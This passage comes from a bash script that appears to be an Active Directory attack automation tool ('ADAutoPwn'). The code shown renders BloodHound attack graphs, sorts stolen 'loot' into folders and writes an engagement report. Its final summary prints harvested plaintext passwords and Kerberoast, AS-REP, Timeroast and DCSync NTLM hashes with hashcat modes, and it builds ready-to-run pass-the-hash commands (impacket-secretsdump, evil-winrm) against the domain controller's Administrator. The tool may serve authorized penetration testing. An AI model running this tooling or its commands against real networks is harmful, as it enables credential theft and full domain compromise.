owned_sids=[sid for sid,n in nodes.items() if n["owned"]]
for s in owned_sids: bfs(s)
if not onpath_e:
    for i,(s,t,l) in enumerate(edges):
        if t in hv and l!="MemberOf": onpath_e.add(i); onpath_n.add(s); onpath_n.add(t)

# ---- prune for readability (keep all if small) ----------------------------
keep=set(onpath_n)|hv|set(owned_sids)
inb=defaultdict(list)
for s,t,l in edges: inb[t].append(s)
for sid in list(keep):
    for v,ei in adj.get(sid,[]): keep.add(v)
    for v in inb.get(sid,[]): keep.add(v)
if len(nodes)<=450: keep=set(nodes.keys())

idx={}; out_nodes=[]
for sid in keep:
    n=nodes.get(sid)
    if not n: continue
    idx[sid]=len(out_nodes)
    out_nodes.append({"id":sid,"label":n["label"],"type":n["type"],
                      "hv":n["hv"],"owned":n["owned"],"p":sid in onpath_n})
seen=set(); out_edges=[]
for i,(s,t,l) in enumerate(edges):
    if s in idx and t in idx:
        k=(s,t,l)
        if k in seen: continue
        seen.add(k)
        out_edges.append({"s":idx[s],"t":idx[t],"l":l,"p":i in onpath_e})

meta = "%d nodes · %d edges · %s%s" % (len(out_nodes), len(out_edges), DOM,
        "" if files else "  (no BloodHound data)")
write_html({"nodes":out_nodes,"edges":out_edges}, meta)
print("graph.html: %d nodes / %d edges" % (len(out_nodes), len(out_edges)))
PYEOF
}

# Open a file in the user's browser, but only when a desktop session exists
# (silently no-ops over SSH/headless so it never blocks an unattended run).
open_in_browser() {
    local f="$1"; [[ "$NO_OPEN" == "1" || "$STEALTH" == "1" ]] && return
    [[ -z "$DISPLAY" && -z "$WAYLAND_DISPLAY" ]] && return
    if   have xdg-open; then ( xdg-open "$f"  >/dev/null 2>&1 & )
    elif have firefox;  then ( firefox  "$f"  >/dev/null 2>&1 & )
    elif have google-chrome; then ( google-chrome "$f" >/dev/null 2>&1 & )
    else return; fi
    case "$f" in http*://*) info "Opened $f in your browser";; *) info "Opened ${f##*/} in your browser";; esac
}

phase_bloodhound_graph() {
    [[ "$DO_BLOODHOUND" != "1" ]] && return
    have python3 || { warn "python3 unavailable → skipping graph.html"; return; }
    local zip; zip=$(ls -t "$OUTDIR"/bloodhound/*.zip 2>/dev/null | head -1)
    local html="$OUTDIR/graph.html"
    subsection "Rendering interactive attack graph (graph.html)"
    BH_ZIP="$zip" BH_HTML="$html" OWNED_FILE="$OUTDIR/valid_creds_map.txt" \
    GDOMAIN="${DOMAIN:-domain.local}" GDC="${DC_FQDN:-$DC_IP}" GDCIP="${DC_IP:-${DC_FQDN}}" render_graph_py
    if [[ -s "$html" ]]; then
        loot "Interactive attack graph → graph.html (offline, portable — drop it in the report)"
        # Don't pop two browser tabs. If you asked for the web (--web) OR the
        # ADAutoGraph web UI is going to launch anyway, keep graph.html as the
        # offline artifact and let the web be what opens. Only auto-open graph.html
        # when the web won't run.
        if [[ "$WEB_FORCE" == "1" || ( "$WEB_UI" == "1" && -n "$(_adautograph_dir)" ) ]]; then
            info "ADAutoGraph web UI will open instead — graph.html kept as an offline/report artifact"
        else
            open_in_browser "$html"
        fi
    else
        warn "Could not generate graph.html"
    fi
}

# --- ADAutoGraph: the standalone local BloodHound-style web UI (separate repo:
# https://github.com/C4sh3R/ADAutoGraph). We auto-start it and POST the freshest
# BloodHound zip to its /api/import endpoint, then open the browser. It's optional:
# if it isn't installed beside this script (or via $ADAUTOGRAPH_DIR) we just skip.
_adautograph_dir() {
    [[ -n "$ADAUTOGRAPH_DIR" && -f "$ADAUTOGRAPH_DIR/server.py" ]] && { echo "$ADAUTOGRAPH_DIR"; return; }
    local self base c
    self=$(readlink -f "${BASH_SOURCE[0]}" 2>/dev/null || echo "$0"); base=$(dirname "$self")
    for c in "$base/../ADAutoGraph" "$base/ADAutoGraph" "$HOME/ADAutoGraph" "$HOME/tools/ADAutoGraph"; do
        [[ -f "$c/server.py" ]] && { readlink -f "$c" 2>/dev/null || echo "$c"; return; }
    done
}
_adautograph_up() {   # server already listening?
    have curl && curl -fsS -m 3 "http://${ADAUTOGRAPH_HOST}:${ADAUTOGRAPH_PORT}/api/domains" >/dev/null 2>&1
}
# Start ADAutoGraph (if down), import a specific BloodHound zip, open the browser.
# Reused by the full run and by `--graph <zip> --web`. Returns 1 if not installed.
_adautograph_launch() {   # _adautograph_launch <zip> [logdir]
    local zip="$1" logdir="${2:-${OUTDIR:-/tmp}}"
    local dir; dir=$(_adautograph_dir)
    [[ -z "$dir" ]] && { warn "ADAutoGraph not found — install it: git clone https://github.com/C4sh3R/ADAutoGraph (or set ADAUTOGRAPH_DIR)"; return 1; }
    have python3 || { warn "python3 unavailable → cannot launch ADAutoGraph"; return 1; }
    section "ADAUTOGRAPH · LOCAL BLOODHOUND-STYLE WEB UI"
    local url="http://${ADAUTOGRAPH_HOST}:${ADAUTOGRAPH_PORT}"

    # 1) start the server if it isn't already up -----------------------------------
    if _adautograph_up; then
        ok "ADAutoGraph already running → $url"
    else
        subsection "Starting ADAutoGraph ($dir)"
        ( cd "$dir" && nohup python3 server.py --host "$ADAUTOGRAPH_HOST" --port "$ADAUTOGRAPH_PORT" \
            >"$logdir/adautograph_server.log" 2>&1 & )
        local i; for i in $(seq 1 20); do _adautograph_up && break; sleep 0.5; done
        if _adautograph_up; then ok "ADAutoGraph up → $url"
        else warn "ADAutoGraph didn't come up (see adautograph_server.log)"; return 1; fi
    fi

    # 2) import the given BloodHound zip via /api/import ----------------------------
    if [[ -n "$zip" && -f "$zip" ]]; then
        subsection "Importing BloodHound data → ADAutoGraph"
        # Pre-mark the principals we already compromised as 'owned' on the web, just
        # like graph.html did via OWNED_FILE. Source (first match wins): --owned file,
        # else this run's valid_creds_map.txt / owned_principals.txt. First column =
        # principal name; the server matches by sAMAccountName/label/SID.
        local of="" owned=""
        if   [[ -n "$OWNED_FILE" && -f "$OWNED_FILE" ]]; then of="$OWNED_FILE"
        elif [[ -f "$OUTDIR/valid_creds_map.txt" ]];      then of="$OUTDIR/valid_creds_map.txt"
        elif [[ -f "$OUTDIR/owned_principals.txt" ]];     then of="$OUTDIR/owned_principals.txt"
        fi
        [[ -n "$of" ]] && owned=$(awk 'NF{print $1}' "$of" | sort -u | paste -sd, -)
        [[ -n "$owned" ]] && info "Marking owned on the graph: ${owned//,/, }"
        run "curl -F zip=@$(basename "$zip") -F name=${DOMAIN:-domain} -F owned=… $url/api/import"
        local resp
        if have curl; then
            resp=$(curl -fsS -m 120 -F "zip=@${zip}" -F "name=${DOMAIN:-domain}" -F "owned=${owned}" "$url/api/import" 2>&1)
        else
            resp=$(python3 - "$zip" "${DOMAIN:-domain}" "$url/api/import" "$owned" <<'PY' 2>&1
import sys,uuid,urllib.request
zp,name,url=sys.argv[1],sys.argv[2],sys.argv[3]
owned=sys.argv[4] if len(sys.argv)>4 else ""
b=uuid.uuid4().hex
def part(n,v): return ('--%s\r\nContent-Disposition: form-data; name="%s"\r\n\r\n%s\r\n'%(b,n,v)).encode()
with open(zp,'rb') as f: data=f.read()
body=part('name',name)+part('owned',owned)
body+=('--%s\r\nContent-Disposition: form-data; name="zip"; filename="bh.zip"\r\nContent-Type: application/zip\r\n\r\n'%b).encode()+data+b'\r\n'
body+=('--%s--\r\n'%b).encode()
req=urllib.request.Request(url,data=body,headers={'Content-Type':'multipart/form-data; boundary=%s'%b})
print(urllib.request.urlopen(req,timeout=120).read().decode())
PY
)
        fi
        [[ -n "$LOGFILE" ]] && echo "$resp" >>"$LOGFILE"
        if grep -q '"ok"' <<<"$resp"; then ok "Imported '${DOMAIN:-domain}' into ADAutoGraph (owned pre-marked)"
        else warn "Import didn't confirm — response: $resp"; fi
    else
        info "No BloodHound zip to import (open the web and drag a zip in, or run the BloodHound phase)"
    fi

    # 3) open the browser on the web UI --------------------------------------------
    open_in_browser "$url"
    loot "ADAutoGraph web UI → ${C_BOLD}$url${C_RESET}"
}

phase_adautograph_web() {
    [[ "$WEB_UI" != "1" || "$STEALTH" == "1" ]] && return
    [[ -z "$(_adautograph_dir)" ]] && return    # not installed → silent skip in a normal run
    _adautograph_launch "$(_bh_latest_zip)" "$OUTDIR"
}

# Standalone: turn a BloodHound zip straight into the interactive graph and open
# it — no scan, no creds. `adautopwn.sh --graph data.zip [-d domain] [-o dir]`
graph_only_mode() {
    local zip="$GRAPH_ZIP"
    have python3 || die "python3 is required to render the graph"
    [[ -f "$zip" ]] || die "BloodHound zip not found: $zip"
    zip="$(cd "$(dirname "$zip")" && pwd)/$(basename "$zip")"
    local outdir html
    outdir="${OUTDIR:-$(dirname "$zip")}"; mkdir -p "$outdir"
    html="$outdir/graph.html"
    section "BLOODHOUND → INTERACTIVE GRAPH (standalone)"
    info "Source zip: ${C_BOLD}$zip${C_RESET}"
    BH_ZIP="$zip" BH_HTML="$html" OWNED_FILE="${OWNED_FILE:-}" \
    GDOMAIN="${DOMAIN:-domain.local}" GDC="${DC_FQDN:-${DC_IP:-domain.local}}" GDCIP="${DC_IP:-${DC_FQDN}}" render_graph_py | sed 's/^/  /'
    if [[ ! -s "$html" ]]; then die "Could not generate the graph from $zip"; fi
    loot "Interactive attack graph → ${C_BOLD}$html${C_RESET}"
    # --web / --adautograph: import this zip into the ADAutoGraph web UI and open
    # that instead of the offline graph.html. Default standalone behaviour is the
    # self-contained graph.html (no server needed).
    if [[ "$WEB_FORCE" == "1" ]]; then
        OUTDIR="$outdir" _adautograph_launch "$zip" "$outdir" || open_in_browser "$html"
    else
        open_in_browser "$html"
    fi
}

# ===========================================================================
#  LOOT CONSOLIDATION  —  fewer files at the top, intermediates tucked away
#  Runs once at the very end. High-value + resume-critical files stay at root;
#  everything else is grouped into enum/ · secrets/ · raw/. Empty files pruned.
# ===========================================================================
finalize_loot() {
    [[ -z "$OUTDIR" || ! -d "$OUTDIR" ]] && return
    section "LOOT CONSOLIDATION"

    # 1) prune zero-byte files at top level (keep the log even if empty)
    find "$OUTDIR" -maxdepth 1 -type f -empty ! -name 'adautopwn.log' -delete 2>/dev/null

    # 2) group intermediates; resume-critical + trophies stay at root
    mkdir -p "$OUTDIR/enum" "$OUTDIR/secrets" "$OUTDIR/raw"
    _mv_loot() { local dst="$1"; shift; local f
        for f in "$@"; do [[ -e "$OUTDIR/$f" ]] && mv -f "$OUTDIR/$f" "$OUTDIR/$dst/" 2>/dev/null; done; }

    _mv_loot enum users_enum.txt users_rpc.txt users_ridbrute.txt users_variants.txt \
        users_variants_valid.txt domain_users.txt domain_groups.txt user_descriptions.txt \
        pass_policy.txt enum4linux.json nmap_dc.txt domain_wordlist.txt shares_auth.txt \
        _userenum_seed.txt _asrep_seed.txt

    _mv_loot secrets laps.txt gmsa.txt dmsa.txt gpp.txt dpapi.txt winrm_users.txt share_secrets.txt \
        coerce.txt relay_ldap.txt trusts.txt certipy_find.txt disabled_accounts.txt \
        deleted_objects.txt disabled_or_locked.txt must_change_password.txt \
        precreated_computers.txt precreated_computers_ldap.txt nopac_scan_*.txt nopac_abuse_*.txt \
        ad_attack_surface.txt ad_attack_surface_ldap.txt cve_checks_unauth.txt cve_checks_auth.txt

    local f
    for f in "$OUTDIR"/acl_writable_*.txt;          do [[ -e "$f" ]] && mv -f "$f" "$OUTDIR/secrets/" 2>/dev/null; done
    for f in "$OUTDIR"/filehash_*.txt "$OUTDIR"/content_*.txt "$OUTDIR"/decrypted_* "$OUTDIR"/cracked_files.txt; do
        [[ -e "$f" ]] && mv -f "$f" "$OUTDIR/raw/" 2>/dev/null; done

    # 3) drop subdirs that ended up empty
    rmdir "$OUTDIR"/enum "$OUTDIR"/secrets "$OUTDIR"/raw 2>/dev/null
    ok "Loot consolidated → trophies at root · details in enum/ · secrets/ · raw/"
}

# ===========================================================================
#  CONSOLIDATED REPORT  —  one human-readable index of the whole engagement
# ===========================================================================
gen_report() {
    [[ -z "$OUTDIR" ]] && return
    local r="$OUTDIR/report.md" o="$OUTDIR"
    # grep -c always prints a single number (0 when no match); capturing it
    # avoids the "0\n0" doubling you get from `&& grep || echo 0`.
    _grepc(){ local n; n=$(grep -cE "$1" "$2" 2>/dev/null); echo "${n:-0}"; }
    local n_users n_asrep n_time n_kerb n_ntlm n_crack
    n_users=$( [[ -s "$o/users_all.txt" ]] && wc -l <"$o/users_all.txt" || echo 0 )
    n_asrep=$(_grepc krb5asrep "$o/asrep_hashes.txt")
    n_time=$( [[ -s "$o/timeroast_hashes.txt" ]] && wc -l <"$o/timeroast_hashes.txt" || echo 0 )
    n_kerb=$( _grepc krb5tgs   "$o/kerberoast_hashes.txt")
    n_ntlm=$( _grepc ':::'     "$o/secretsdump.txt")
    n_crack=$( [[ -s "$o/cracked_passwords.txt" ]] && wc -l <"$o/cracked_passwords.txt" || echo 0 )

    {
        echo "# ADAutoPwn — Engagement Report"
        echo
        echo "- **Target:** \`$DC_IP\` (${DC_FQDN:-?})"
        echo "- **Domain:** ${DOMAIN:-?}"
        echo "- **Auth mode:** $([[ $KERBEROS == 1 ]] && echo Kerberos || echo NTLM)"
        echo "- **Authenticated as:** $([[ $HAVE_AUTH == 1 ]] && echo "\`$USER\` ✅" || echo "—")"
        echo "- **Generated:** $(date '+%Y-%m-%d %H:%M:%S')"
        echo
        echo "## At a glance"
        echo
        echo "| Metric | Count |"
        echo "|---|---|"
        echo "| Users enumerated | $n_users |"
        echo "| AS-REP hashes | $n_asrep |"
        echo "| Timeroast hashes | $n_time |"
        echo "| Kerberoast hashes | $n_kerb |"
        echo "| NTLM hashes (DCSync) | $n_ntlm |"
        echo "| Cracked passwords | $n_crack |"
        echo
        echo "## Attack graph"
        echo
        echo "Open [\`graph.html\`](graph.html) in a browser — interactive, offline, highlights paths to Domain Admins/DC."
        echo

        if [[ -s "$o/valid_creds_map.txt" ]]; then
            echo "## Working identities (provenance)"; echo
            echo '```'; sort -u "$o/valid_creds_map.txt"; echo '```'; echo
        fi
        if [[ -s "$o/credential_map.txt" ]]; then
            echo "## Recovered secrets"; echo
            echo '```'; sort -u "$o/credential_map.txt"; echo '```'; echo
        fi
        if grep -qiE 'ESC[0-9]+' "$o"/certipy_find*.txt 2>/dev/null; then
            echo "## ⚠ Vulnerable ADCS templates"; echo
            echo '```'; grep -hiE 'Template Name|ESC[0-9]+' "$o"/certipy_find*.txt | head -40; echo '```'; echo
        fi
        local acl; acl=$(ls "$o"/acl_writable_*.txt 2>/dev/null | head -1)
        if [[ -n "$acl" ]]; then
            echo "## Exploitable ACLs"; echo
            echo "Writable rights detected — see \`secrets/$(basename "$acl")\`. Re-run with \`--abuse\` to weaponize."; echo
        fi
        # Only real trust results have "attr: value" lines; skip bloodyAD's
        # NoResultError dump (which echoes the filter and trips a naive grep).
        if [[ -s "$o/trusts.txt" ]] && grep -qE 'trustPartner: *[^ ]|trustDirection: *[0-9]' "$o/trusts.txt" 2>/dev/null; then
            echo "## Domain trusts"; echo
            echo '```'; grep -E 'trustPartner: |trustDirection: |trustType: |flatName: ' "$o/trusts.txt" | head -20; echo '```'; echo
        fi

        echo "## Loot layout"; echo
        echo "- Root: trophies + resume files (\`users_all.txt\`, \`found_passwords.txt\`, hashes, \`*.ccache\`, \`report.md\`, \`graph.html\`)"
        echo "- \`enum/\` — enumeration intermediates (users, groups, policy, nmap, wordlist)"
        echo "- \`secrets/\` — LAPS/gMSA/GPP/DPAPI, ACL dumps, trusts, ADCS, coercion"
        echo "- \`shares/\` — looted share contents · \`bloodhound/\` — collection zip · \`raw/\` — misc"
        echo
        echo "_Full live log: \`adautopwn.log\`_"
    } >"$r"
    ok "Consolidated report → report.md"
}

# Render the pivot path that led to one identity (root → … → node), top-down,
# stepping one indent per hop and labelling each hop with the technique used.
_render_chain() {
    local cur="$1" seen="" chain=()
    while [[ -n "$cur" ]]; do
        chain=("$cur" "${chain[@]}")
        [[ "$seen" == *"|${cur}|"* ]] && break          # cycle guard
        seen="${seen}|${cur}|"
        cur="${CHAIN_FROM[$cur]:-}"
    done
    local i n via pad crown
    for ((i=0; i<${#chain[@]}; i++)); do
        n="${chain[i]}"; crown=""; [[ -n "${OWNED_ADMIN[$n]:-}" ]] && crown="  ${C_YELLOW}👑${C_RESET}"
        if (( i==0 )); then
            detail "      ${C_GREEN}${C_BOLD}${n}${C_RESET}${crown} ${C_DIM}(start)${C_RESET}"
        else
            via="${CHAIN_VIA[$n]:-pivot}"; pad="$(printf '%*s' $((i*2)) '')"
            detail "      ${pad}${C_GREY}└─${C_RESET} ${C_PURPLE}${via}${C_RESET} ${C_GREY}▶${C_RESET} ${C_BOLD}${n}${C_RESET}${crown}"
        fi
    done
}

# ===========================================================================
#  FINAL SUMMARY
# ===========================================================================
final_summary() {
    section "OPERATION SUMMARY"
    local auth_state users_n asrep_n time_n kerb_n ntlm_n cracked_n adcs_state admin_state
    auth_state=$([[ $HAVE_AUTH == 1 ]] && echo "${C_GREEN}YES${C_RESET} ${C_DIM}($USER)${C_RESET}" || echo "${C_YELLOW}NO${C_RESET}")
    _cnt_lines(){ [[ -s "$1" ]] && wc -l <"$1" || echo 0; }
    _cnt_re(){ local n; n=$(grep -cE "$1" "$2" 2>/dev/null); echo "${n:-0}"; }
    users_n=$(_cnt_lines "$OUTDIR/users_all.txt")
    asrep_n=$(_cnt_re 'krb5asrep' "$OUTDIR/asrep_hashes.txt")
    time_n=$(_cnt_lines "$OUTDIR/timeroast_hashes.txt")
    kerb_n=$(_cnt_re 'krb5tgs' "$OUTDIR/kerberoast_hashes.txt")
    ntlm_n=$(_cnt_re ':::' "$OUTDIR/secretsdump.txt")
    cracked_n=$(_cnt_lines "$OUTDIR/cracked_passwords.txt")
    # ESC found → VULNERABLE; a CA exists but no ESC for our creds → "CA present"
    # (don't say "not flagged" when an Enterprise CA was clearly discovered — the ESC
    # may only be visible to a group we haven't pivoted to yet, e.g. CA-OPERATORS);
    # nothing at all → "not flagged".
    if grep -qiE 'ESC[0-9]+' "$OUTDIR"/certipy_find*.txt 2>/dev/null; then
        adcs_state="${C_RED}VULNERABLE${C_RESET}"
    elif grep -qiE 'Enrollment Service|Certificate Auth|pKIEnrollment|Found PKI|Certificate Templates|Enrollment WebService' "$OUTDIR"/certipy_find*.txt "$OUTDIR"/ad_attack_surface_ldap.txt "$OUTDIR"/adautopwn.log 2>/dev/null; then
        adcs_state="${C_YELLOW}CA present (no ESC for current creds)${C_RESET}"
    else
        adcs_state="${C_GREY}not flagged${C_RESET}"
    fi
    admin_state=$([[ "$ntlm_n" -gt 0 || ${#OWNED_ADMIN[@]} -gt 0 ]] && echo "${C_GREEN}${C_BOLD}DOMAIN IMPACT${C_RESET}" || echo "${C_YELLOW}no domain dump yet${C_RESET}")

    ui_panel_top
    ui_kv "Target" "$DC_IP ${C_DIM}(${DC_FQDN:-?})${C_RESET}"
    ui_kv "Domain" "${DOMAIN:-?}"
    ui_kv "Auth mode" "$([[ $KERBEROS == 1 ]] && echo Kerberos || echo NTLM)"
    ui_kv "Authenticated" "$auth_state"
    ui_kv "Result" "$admin_state"
    ui_kv "Compromised" "${C_GREEN}${#OWNED_GROUPS[@]}${C_RESET} principal(s)${C_DIM}$( [[ ${#OWNED_ADMIN[@]} -gt 0 ]] && echo ", ${#OWNED_ADMIN[@]} admin" )${C_RESET}"
    ui_kv "Loot dir" "${C_DIM}…/${C_RESET}$(basename "$OUTDIR")"
    ui_panel_mid
    ui_metric "Users enumerated" "$users_n"
    ui_metric "AS-REP hashes" "$asrep_n" "hashcat -m 18200"
    ui_metric "Timeroast hashes" "$time_n" "hashcat -m 31300"
    ui_metric "Kerberoast hashes" "$kerb_n" "hashcat -m 13100"
    ui_metric "NTLM hashes" "$ntlm_n" "DCSync / offline NTDS"
    ui_metric "Cracked passwords" "$cracked_n"
    ui_metric "NT hashes (PtH)" "$(_cnt_lines "$OUTDIR/recovered_hashes.txt")" "shadow creds / dumps · hashcat -m 1000"
    ui_metric "ADCS" "$adcs_state"
    ui_panel_bottom

    # Credential provenance map — where every secret/identity came from
    if [[ -s "$OUTDIR/credential_map.txt" || -s "$OUTDIR/valid_creds_map.txt" ]]; then
        subsection "Credential map (what we got & where it came from)"
        if [[ -s "$OUTDIR/valid_creds_map.txt" ]]; then
            echo -e "    ${C_BOLD}Working identities:${C_RESET}"
            sort -u "$OUTDIR/valid_creds_map.txt" | while IFS= read -r l; do echo -e "      ${C_GREEN}$l${C_RESET}"; done
        fi
        if [[ -s "$OUTDIR/credential_map.txt" ]]; then
            echo -e "    ${C_BOLD}Recovered passwords:${C_RESET}"
            sort -u "$OUTDIR/credential_map.txt" | while IFS= read -r l; do echo -e "      ${C_MAGENTA}$l${C_RESET}"; done
        fi
        ok "Full map saved → credential_map.txt / valid_creds_map.txt"
    fi

    # Compromised principals — every identity we took control of, with the groups
    # it belongs to. Admins are crowned and shown bright; everyone else is plain.
    if [[ ${#OWNED_GROUPS[@]} -gt 0 ]]; then
        section "COMPROMISED PRINCIPALS · accounts under our control"
        local _u
        # admins first (bright gold + 👑), then everyone else (plain green), sorted
        while IFS= read -r _u; do [[ -z "$_u" ]] && continue
            detail "      ${C_YELLOW}${C_BOLD}👑 ${_u}${C_RESET}  ${C_RED}${C_BOLD}[ADMIN]${C_RESET}  ${C_DIM}${OWNED_GROUPS[$_u]}${C_RESET}"
        done < <(for k in "${!OWNED_ADMIN[@]}"; do printf '%s\n' "$k"; done | sort)
        while IFS= read -r _u; do [[ -z "$_u" ]] && continue
            detail "      ${C_GREEN}${_u}${C_RESET}  ${C_DIM}${OWNED_GROUPS[$_u]}${C_RESET}"
        done < <(for k in "${!OWNED_GROUPS[@]}"; do [[ -z "${OWNED_ADMIN[$k]:-}" ]] && printf '%s\n' "$k"; done | sort)
        ok "${#OWNED_GROUPS[@]} compromised (${#OWNED_ADMIN[@]} admin) → owned_principals.txt"
    fi

    # Attack chain — the path of pivots that connected initial access to our
    # highest-value identities (built from the edges recorded as each identity
    # was obtained: which account we were, and the technique that yielded it).
    if [[ ${#CHAIN_VIA[@]} -gt 0 ]]; then
        section "ATTACK CHAIN · the path we followed"
        local k; local -A _isparent=()
        for k in "${!CHAIN_FROM[@]}"; do _isparent["${CHAIN_FROM[$k]}"]=1; done
        local -a targets=()
        if [[ ${#OWNED_ADMIN[@]} -gt 0 ]]; then          # show the path(s) to each admin we landed
            for k in "${!OWNED_ADMIN[@]}"; do targets+=("$k"); done
        else                                              # else the chain endpoints (leaves)
            for k in "${!CHAIN_VIA[@]}"; do [[ -z "${_isparent[$k]:-}" ]] && targets+=("$k"); done
        fi
        [[ ${#targets[@]} -eq 0 ]] && for k in "${!CHAIN_VIA[@]}"; do targets+=("$k"); done
        local t first=1
        while IFS= read -r t; do
            [[ -z "$t" ]] && continue
            [[ "$first" == 1 ]] || detail ""
            first=0; _render_chain "$t"
        done < <(printf '%s\n' "${targets[@]}" | sort -u)
        ok "Attack chain mapped above"
    fi

    # ----- FULL HARVEST: everything recovered, in detail + colour -----------
    local dd=""
    [[ -s "$OUTDIR/secretsdump.txt" ]] && grep -qE ':::' "$OUTDIR/secretsdump.txt" 2>/dev/null && dd="$OUTDIR/secretsdump.txt"
    [[ -z "$dd" && -s "$OUTDIR/ntds_local.txt" ]] && grep -qE ':::' "$OUTDIR/ntds_local.txt" 2>/dev/null && dd="$OUTDIR/ntds_local.txt"

    if [[ -s "$OUTDIR/found_passwords.txt" || -s "$OUTDIR/asrep_hashes.txt" || -s "$OUTDIR/timeroast_hashes.txt" || -s "$OUTDIR/kerberoast_hashes.txt" || -n "$dd" ]]; then
        section "FULL HARVEST · EVERYTHING RECOVERED"

        if [[ -s "$OUTDIR/found_passwords.txt" ]]; then
            detail "  ${C_BOLD}${C_GREEN}» Plaintext passwords${C_RESET} ${C_DIM}($(sort -u "$OUTDIR/found_passwords.txt" | grep -c . ) unique)${C_RESET}"
            while IFS= read -r p; do
                [[ -z "$p" ]] && continue
                local who; who=$(grep -F ":$p" "$OUTDIR/valid_creds_map.txt" 2>/dev/null | head -1 | awk '{print $1}')
                if [[ -n "$who" ]]; then detail "      ${C_GREEN}${C_BOLD}${who%%:*}${C_RESET} ${C_DIM}:${C_RESET} ${C_GREEN}$p${C_RESET}"
                else detail "      ${C_GREEN}$p${C_RESET}"; fi
            done < <(sort -u "$OUTDIR/found_passwords.txt")
        fi

        if [[ -s "$OUTDIR/recovered_hashes.txt" ]]; then
            detail "  ${C_BOLD}${C_MAGENTA}» NT hashes recovered${C_RESET} ${C_DIM}($(sort -u "$OUTDIR/recovered_hashes.txt" | grep -c .) — Pass-the-Hash · hashcat -m 1000)${C_RESET}"
            local _hl _hu _hh
            while IFS= read -r _hl; do
                [[ -z "$_hl" ]] && continue
                _hu=$(awk '{print $1}' <<<"$_hl"); _hh=$(awk '{print $2}' <<<"$_hl")
                detail "      ${C_MAGENTA}${C_BOLD}${_hu}${C_RESET} ${C_DIM}:${C_RESET} ${C_MAGENTA}${_hh}${C_RESET}"
            done < <(sort -u "$OUTDIR/recovered_hashes.txt")
        fi

        if [[ -s "$OUTDIR/asrep_hashes.txt" ]] && grep -qi krb5asrep "$OUTDIR/asrep_hashes.txt"; then
            detail "  ${C_BOLD}${C_YELLOW}» AS-REP roastable${C_RESET} ${C_DIM}($(grep -c krb5asrep "$OUTDIR/asrep_hashes.txt") — hashcat -m 18200)${C_RESET}"
            while IFS= read -r h; do local w; w=$(echo "$h" | grep -oiP '\$krb5asrep\$[0-9]+\$\K[^@:]+')
                detail "      ${C_CYAN}${w:-?}${C_RESET}  ${C_DIM}${h:0:54}…${C_RESET}"; done < <(grep -i krb5asrep "$OUTDIR/asrep_hashes.txt")
        fi

        if [[ -s "$OUTDIR/kerberoast_hashes.txt" ]] && grep -qi krb5tgs "$OUTDIR/kerberoast_hashes.txt"; then
            # One entry per SPN account: the same account roasted across rounds yields
            # different (nonce-varied) hashes — show it once, not duplicated.
            local _kr; _kr=$(grep -i krb5tgs "$OUTDIR/kerberoast_hashes.txt" | while IFS= read -r h; do
                printf '%s|%s\n' "$(grep -oiP '\$krb5tgs\$[0-9]+\$\*\K[^$*]+' <<<"$h")" "$h"; done \
                | sort -t'|' -k1,1 -u | cut -d'|' -f2-)
            detail "  ${C_BOLD}${C_YELLOW}» Kerberoastable${C_RESET} ${C_DIM}($(printf '%s\n' "$_kr" | grep -c .) — hashcat -m 13100)${C_RESET}"
            while IFS= read -r h; do [[ -z "$h" ]] && continue; local w; w=$(echo "$h" | grep -oiP '\$krb5tgs\$[0-9]+\$\*\K[^$*]+')
                detail "      ${C_CYAN}${w:-?}${C_RESET}  ${C_DIM}${h:0:54}…${C_RESET}"; done < <(printf '%s\n' "$_kr")
        fi

        if [[ -s "$OUTDIR/timeroast_hashes.txt" ]]; then
            detail "  ${C_BOLD}${C_YELLOW}» Timeroastable machine accounts${C_RESET} ${C_DIM}($(wc -l <"$OUTDIR/timeroast_hashes.txt") — hashcat -m 31300)${C_RESET}"
            while IFS= read -r h; do local w; w=$(echo "$h" | grep -oiP '\$sntp-ms\$[^$]*\$\K[^$: ]+' | head -1)
                detail "      ${C_CYAN}${w:-?}${C_RESET}  ${C_DIM}${h:0:54}…${C_RESET}"; done <"$OUTDIR/timeroast_hashes.txt"
        fi

        if [[ -n "$dd" ]]; then
            detail "  ${C_BOLD}${C_RED}» DOMAIN NTLM DUMP${C_RESET} ${C_DIM}($(grep -cE ':::' "$dd") accounts — Pass-the-Hash ready)${C_RESET}"
            # high-value first (Administrator, krbtgt), then the rest
            while IFS= read -r line; do
                local u nt lc; u=$(echo "$line" | cut -d: -f1); nt=$(echo "$line" | cut -d: -f4); lc="${u,,}"
                case "$lc" in
                    *administrator|*krbtgt|*'$') detail "      ${C_RED}${C_BOLD}${u}${C_RESET} ${C_DIM}:${C_RESET} ${C_RED}${nt}${C_RESET}" ;;
                    *) detail "      ${C_CYAN}${u}${C_RESET} ${C_DIM}:${C_RESET} ${C_MAGENTA}${nt}${C_RESET}" ;;
                esac
            done < <(grep -E ':::' "$dd" | grep -iE '(administrator|krbtgt):' ; grep -E ':::' "$dd" | grep -ivE '(administrator|krbtgt):')
            local ah; ah=$(grep -iE '^[^:]*administrator:' "$dd" | head -1 | cut -d: -f4)
            [[ -n "$ah" ]] && detail "      ${C_BOLD}${C_RED}↳ PtH:${C_RESET} ${C_DIM}impacket-secretsdump -hashes :$ah Administrator@$DC_IP  ·  evil-winrm -i $DC_IP -u Administrator -H $ah${C_RESET}"
        fi
        echo
    fi

    # Build the human report + interactive graph, THEN tidy the loot dir
    # (gen_report/graph read files while they're still at the root).
    gen_report
    phase_bloodhound_graph
    phase_adautograph_web
    finalize_loot

    echo
    local report_state graph_state web_state
    report_state=$([[ -s "$OUTDIR/report.md" ]] && echo "${C_GREEN}ready${C_RESET}" || echo "${C_YELLOW}missing${C_RESET}")
    graph_state=$([[ -s "$OUTDIR/graph.html" ]] && echo "${C_GREEN}ready${C_RESET}" || echo "${C_YELLOW}not generated${C_RESET}")
    web_state=$([[ "$WEB_UI" == "1" ]] && echo "http://${ADAUTOGRAPH_HOST}:${ADAUTOGRAPH_PORT}" || echo "${C_DIM}disabled${C_RESET}")

    detail "${C_GREY}    ╔══════════════════════════════════════════════════════════════════╗${C_RESET}"
    detail "${C_GREY}    ║${C_RESET} ${C_BOLD}${C_GREEN}ADAutoPwn complete${C_RESET} ${C_DIM}v${VERSION}${C_RESET}                                      ${C_GREY}║${C_RESET}"
    detail "${C_GREY}    ╠══════════════════════════════════════════════════════════════════╣${C_RESET}"
    detail "    ${C_GREY}║${C_RESET} ${C_CYAN}Report${C_RESET}      ${report_state}  ${C_DIM}$OUTDIR/report.md${C_RESET}"
    detail "    ${C_GREY}║${C_RESET} ${C_CYAN}Graph${C_RESET}       ${graph_state}  ${C_DIM}$OUTDIR/graph.html${C_RESET}"
